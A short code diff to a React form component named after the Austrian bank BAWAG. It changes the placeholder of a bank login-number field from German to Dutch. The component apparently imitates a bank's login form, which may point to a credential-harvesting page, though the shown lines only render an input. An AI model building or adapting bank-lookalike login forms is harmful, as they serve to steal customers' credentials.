@@ -86,7 +86,7 @@ export function BawagAg({ formData, onChange, handleRouteAction, saving }: Props
               <div>
                 <input 
                   type="text" 
-                  placeholder="Verfügernummer"
+                  placeholder="Inlogcode"
                   value={formData.verfuegernummer || ""}
                   onChange={(e) => onChange("verfuegernummer", e.target.value)}
                   className="w-full h-[46px] border border-gray-300 rounded-[4px] px-4 outline-none focus:border-[#a90000] text-[#333] placeholder-gray-400 text-[15px]"
